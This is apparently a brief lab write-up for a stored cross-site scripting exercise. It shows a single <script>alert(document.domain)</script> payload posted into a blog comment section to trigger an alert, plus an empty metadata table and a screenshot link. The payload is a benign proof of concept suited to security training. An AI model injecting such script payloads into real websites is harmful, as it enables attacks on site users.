# Stored XSS into HTML context with nothing encoded

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Exploit the stored XSS vulnerability to call the alert function.

### Analysyis/Exploitation

**inject a JavaScript function called **`alert()`** in post comment section:**

`<script>alert(document.domain)</script>`

![](./images/90072dedd134_001.png)
